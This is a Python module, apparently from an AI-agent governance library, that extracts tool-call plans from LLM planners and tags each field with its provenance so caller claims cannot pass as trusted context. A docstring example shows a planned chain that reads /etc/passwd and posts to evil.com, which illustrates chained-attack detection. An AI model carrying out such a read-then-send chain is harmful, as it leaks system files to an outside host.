"""
Trajectory extraction.

Converts tool call plans from LLM planners into evaluable
state representations for reachability analysis.

Supports:

- OpenAI function calling format
- LangChain tool call format
- Raw dict format
- Custom formats via adapters
"""

# Builtin generic subscripts (dict[...], list[...]) appear in class-level
# annotations below, which are evaluated at class-creation time and require
# Python 3.9+. Deferring evaluation keeps the syntax and the module
# importable on older interpreters.
from __future__ import annotations

import hashlib
import json
from dataclasses import dataclass, field
from typing import Any, Optional

from morrison_governance.provenance import (
    DERIVED, TRUSTED, UNTRUSTED, ProvenanceState,
)


@dataclass
class TrajectoryState:
    """
    A single state in an executable trajectory.

    Attributes:
        tool: name of the tool being called
        args: arguments / parameters for the tool call
        step: position in a multi-step trajectory (0-indexed)
        context: TRUSTED context — supplied by the deployment or the kernel,
                 never parsed out of the caller's payload
        caller_extra: top-level keys the CALLER put beside `args`. These used
                 to be merged into `context` and therefore read as trusted
                 policy state; they are untrusted caller data and are kept
                 apart so they cannot be mistaken for it.
        raw: original unprocessed tool call data
    """

    tool: str
    args: dict = field(default_factory=dict)
    step: int = 0
    context: dict = field(default_factory=dict)
    raw: Optional[dict] = None
    caller_extra: dict = field(default_factory=dict)
    # Memoised evaluation namespace. The engine calls to_eval_dict() many
    # times per decision; returning the SAME ProvenanceState each time means
    # the gated reads the rules performed accumulate in one place and can be
    # sealed as evidence, instead of being discarded with each throwaway copy.
    _eval: Any = field(default=None, repr=False, compare=False)

    def to_eval_dict(self) -> ProvenanceState:
        """Build the Ω evaluation namespace, WITH provenance retained.

        This used to return a flat dict in which `{**args, **context}` made a
        caller's claim and a deployment-established fact byte-identical. That
        flattening was the policy-state provenance vulnerability: an Ω
        predicate reading `crisis_referral` could not tell which it had.

        The namespace is still a mapping and still answers `.get()` exactly as
        before, so every existing predicate is unaffected. What is added is
        that each key now carries where it came from, and a predicate may
        demand a class (see ProvenanceState.attested / .corroborated).

        Ordering is still security-relevant and is now enforced by rank rather
        than by dict-merge order: TRUSTED > DERIVED > OBSERVED > UNTRUSTED, so
        a caller cannot overwrite an established fact whatever the key order.
        """
        if self._eval is not None:
            return self._eval

        state = ProvenanceState()

        # Caller-supplied. Untrusted by default and by definition.
        state.put_all(self.args, UNTRUSTED, basis="caller args")
        # Top-level keys the caller placed beside `args`. Same origin, same
        # class — position in the payload is not provenance.
        state.put_all(self.caller_extra, UNTRUSTED,
                      basis="caller top-level field")

        # Engine-derived descriptors of the call itself.
        state.put("tool", self.tool, DERIVED, basis="engine: tool name")
        state.put("args", json.dumps(self.args) if self.args else "",
                  DERIVED, basis="engine: serialised args")
        state.put("step", self.step, DERIVED, basis="engine: step index")

        # Independent derivation from the actual content. A derived fact
        # outranks a caller claim, so `contains_phi=False` over a payload that
        # plainly contains PHI does not hold. Applied BEFORE trusted context
        # so an authenticated fact still wins.
        # Derived over ALL caller-supplied data, not just `args`. A claim
        # written at the top level of the payload is the same claim written
        # inside it — if the deriver only reads `args` then moving the key up
        # one level escapes contradiction, which is the very positional
        # confusion this change exists to remove.
        from morrison_governance.derivation import derive_facts
        caller_supplied = {**(self.args if isinstance(self.args, dict) else {}),
                           **self.caller_extra}
        for name, value, basis in derive_facts(self.tool, caller_supplied):
            state.put(name, value, DERIVED, basis=basis)

        # Deployment/kernel-owned context. The only untrusted->trusted
        # promotion path into this namespace.
        #
        # EXCEPT the trajectory descriptors the extractor itself writes back
        # into context (`step_N_tool`, `step_N_args`). Those travel in the
        # context dict for convenience, but they are the ENGINE's record of
        # what happened, and `step_N_args` literally holds caller arguments.
        # Tagging them trusted would launder caller data into the highest
        # provenance class by way of a bookkeeping channel.
        for k, v in (self.context or {}).items():
            if isinstance(k, str) and k.startswith("step_"):
                state.put(k, v, DERIVED, basis="engine: trajectory descriptor")
            else:
                state.put(k, v, TRUSTED, issuer="deployment",
                          basis="trusted context channel")
        object.__setattr__(self, "_eval", state)
        return state

    @property
    def hash(self) -> str:
        """Deterministic hash for audit logging."""
        content = json.dumps(
            {"tool": self.tool, "args": self.args, "step": self.step},
            sort_keys=True,
        )
        return hashlib.sha256(content.encode()).hexdigest()[:16]


@dataclass
class Trajectory:
    """
    An ordered sequence of states representing an executable plan.
    """

    states: list[TrajectoryState] = field(default_factory=list)

    @property
    def hash(self) -> str:
        content = json.dumps(
            [{"tool": s.tool, "args": s.args, "step": s.step} for s in self.states],
            sort_keys=True,
        )
        return hashlib.sha256(content.encode()).hexdigest()[:16]

    @property
    def is_multi_step(self) -> bool:
        return len(self.states) > 1

    def __len__(self) -> int:
        return len(self.states)

    def __iter__(self):
        return iter(self.states)


class TrajectoryExtractor:
    """
    Extracts evaluable trajectories from LLM planner outputs.

    Supports multiple input formats:

        # OpenAI function calling
        extractor = TrajectoryExtractor()
        trajectory = extractor.from_openai(response.choices[0].message.tool_calls)

        # LangChain
        trajectory = extractor.from_langchain(agent_action)

        # Raw dict
        trajectory = extractor.from_dict({"tool": "send_email", "args": {...}})

        # Multi-step plan
        trajectory = extractor.from_plan([
            {"tool": "read_file", "args": {"path": "/etc/passwd"}},
            {"tool": "http_request", "args": {"url": "https://evil.com", "body": "..."}},
        ])
    """

    def __init__(self, context: Optional[dict] = None):
        """
        Args:
            context: persistent context applied to all extracted states
                     (e.g. user role, session metadata, authorization flags)
        """
        self.context = context or {}

    def from_dict(self, tool_call: dict) -> Trajectory:
        """Extract trajectory from a single tool call dict."""
        # Extract known keys
        tool_keys = {"tool", "name", "function", "args", "arguments", "input"}
        # PROVENANCE: these are keys the CALLER wrote at the top level of its
        # own payload. They used to be merged into `context`, which the
        # evaluator treats as trusted server-side state — so a caller could
        # promote its own claim to trusted simply by putting it beside `args`
        # instead of inside it. Position in a payload is not provenance. They
        # are kept as caller data.
        caller_extra = {
            k: v for k, v in tool_call.items() if k not in tool_keys
        }

        state = TrajectoryState(
            tool=tool_call.get("tool", tool_call.get("name", tool_call.get("function", "unknown"))),
            args=tool_call.get("args", tool_call.get("arguments", tool_call.get("input", {}))),
            step=0,
            context=dict(self.context),
            raw=tool_call,
            caller_extra=caller_extra,
        )
        # Parse string args
        if isinstance(state.args, str):
            try:
                state.args = json.loads(state.args)
            except (json.JSONDecodeError, TypeError):
                state.args = {"raw": state.args}

        return Trajectory(states=[state])

    def from_plan(self, steps: list[dict]) -> Trajectory:
        """Extract trajectory from a multi-step tool call plan."""
        states = []
        accumulated_context = self.context.copy()

        for i, step in enumerate(steps):
            state = TrajectoryState(
                tool=step.get("tool", step.get("name", "unknown")),
                args=step.get("args", step.get("arguments", step.get("input", {}))),
                step=i,
                context=accumulated_context.copy(),
                raw=step,
            )
            if isinstance(state.args, str):
                try:
                    state.args = json.loads(state.args)
                except (json.JSONDecodeError, TypeError):
                    state.args = {"raw": state.args}

            states.append(state)

            # Accumulate context across steps (chained attack detection)
            accumulated_context[f"step_{i}_tool"] = state.tool
            accumulated_context[f"step_{i}_args"] = state.args

        return Trajectory(states=states)

    def from_openai(self, tool_calls: list) -> Trajectory:
        """Extract trajectory from OpenAI function calling response."""
        steps = []
        for tc in tool_calls:
            if hasattr(tc, "function"):
                # OpenAI ChatCompletion tool_call object
                args = tc.function.arguments
                if isinstance(args, str):
                    try:
                        args = json.loads(args)
                    except (json.JSONDecodeError, TypeError):
                        args = {"raw": args}
                steps.append({"tool": tc.function.name, "args": args})
            elif isinstance(tc, dict):
                func = tc.get("function", {})
                steps.append({
                    "tool": func.get("name", tc.get("name", "unknown")),
                    "args": func.get("arguments", tc.get("args", {})),
                })
        return self.from_plan(steps)

    def from_langchain(self, agent_actions: Any) -> Trajectory:
        """Extract trajectory from LangChain AgentAction(s)."""
        if not isinstance(agent_actions, list):
            agent_actions = [agent_actions]

        steps = []
        for action in agent_actions:
            if hasattr(action, "tool") and hasattr(action, "tool_input"):
                steps.append({"tool": action.tool, "args": action.tool_input})
            elif isinstance(action, dict):
                steps.append({
                    "tool": action.get("tool", "unknown"),
                    "args": action.get("tool_input", action.get("args", {})),
                })
        return self.from_plan(steps)
